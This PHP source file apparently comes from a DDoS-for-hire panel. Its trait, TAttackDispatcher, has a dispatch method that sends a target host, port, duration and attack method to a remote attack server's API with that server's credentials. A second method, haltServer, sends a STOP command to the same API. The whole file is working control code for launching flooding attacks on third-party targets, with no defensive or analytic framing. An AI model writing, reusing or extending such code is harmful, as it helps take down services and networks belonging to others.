<?php
namespace App\Presenters;
use App\Models\AttackManager;
use App\Exceptions\AttackIssueException;

trait TAttackDispatcher
{
    private function dispatch(object $server, object $method, string $target, int $time): bool
    {      
        $target = (object) parse_url($target);
        $host   = $target->scheme."://".$target->host;
        $host   = rawurlencode($host);
        $port   = $target->port;
        $url    = "http://".$server->addr."/api.php?key=".$server->creds."&host=$host&port=$port&time=$time&method=".$method->trigger;

        $result = @file_get_contents($url);
        if(strpos($result, "Ошибка")) throw new AttackIssueException($result);
        
        return true;
    }
    
    private function haltServer(object $attack)
    {
        if(($attack->begin + $attack->duration) <= time()) return false;
        $server = $attack->ref("machines", "machine");
        $target = (object) parse_url($attack->target);
        $host   = $target->scheme."://".$target->host;
        $host   = rawurlencode($host);
        $port   = $target->port;
        $url    = "http://".$server->addr."/api.php?key=".$server->creds."&method=STOP&time=-1&host=$host&port=$port";
    
        $result = @file_get_contents($url);
        if(strpos($result, "Ошибка")) throw new AttackIssueException($result);
    
        return true;
    }
}
